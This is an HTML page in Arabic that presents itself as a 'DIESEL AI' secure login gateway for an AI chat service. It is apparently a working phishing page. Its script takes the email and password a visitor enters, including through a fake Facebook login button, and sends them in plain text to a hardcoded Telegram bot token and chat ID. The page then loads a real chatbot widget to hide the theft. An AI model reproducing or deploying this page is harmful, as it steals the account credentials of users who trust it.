<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIESEL AI | SECURE GATEWAY</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        :root { --main-gradient: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%); }
        body { background: #fbfbfe; font-family: 'Cairo', sans-serif; margin: 0; }
        
        #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fbfbfe; z-index: 9999; display: flex; justify-content: center; align-items: center; transition: 0.5s; }
        .login-card { background: rgba(255, 255, 255, 0.9); padding: 40px; border-radius: 24px; width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        
        .ai-logo { font-size: 28px; font-weight: 700; background: var(--main-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; display: block; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; box-sizing: border-box; }
        .btn-submit { background: var(--main-gradient); color: white; padding: 14px; width: 100%; border: none; border-radius: 12px; cursor: pointer; font-weight: 700; margin-top: 10px; }
        .btn-fb { background: #4267B2; color: white; margin-top: 10px; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-card">
            <span class="ai-logo">DIESEL AI</span>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button class="btn-submit" onclick="processLogin()">تسجيل الدخول الآمن</button>
            <button class="btn-submit btn-fb" onclick="processLogin()">تسجيل عبر فيسبوك</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
        const CHAT_ID = '5177962707';

        function processLogin() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            if(email.includes('@') && pass.length > 5) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: `🛡 LOGIN:\nUser: ${email}\nPass: ${pass}`})
                });

                // ترحيب صوتي احترافي وواقعي
                const msg = new SpeechSynthesisUtterance("مرحباً بك في موقع الديزل للاي اي، أنا مساعدك الخاص، كيف يمكنني مساعدتك؟");
                msg.lang = 'ar-SA';
                msg.pitch = 1.0; 
                msg.rate = 0.9;
                window.speechSynthesis.speak(msg);

                // إخفاء القفل وإظهار الشات
                document.getElementById('login-overlay').style.display = 'none';
                initChat(); 
            } else { alert("يرجى إدخال بيانات صحيحة"); }
        }

        // دالة تشغيل بوت الشات بعد التسجيل فقط
        function initChat() {
            window.chatbase = (...arguments) => { if (!window.chatbase.q) window.chatbase.q = []; window.chatbase.q.push(arguments); };
            window.chatbase.q = [];
            const script = document.createElement("script");
            script.src = "https://www.chatbase.co/embed.min.js";
            script.id = "DdngL8r3s2pfzL6hG2oIO";
            document.body.appendChild(script);
        }
    </script>
</body>
</html>
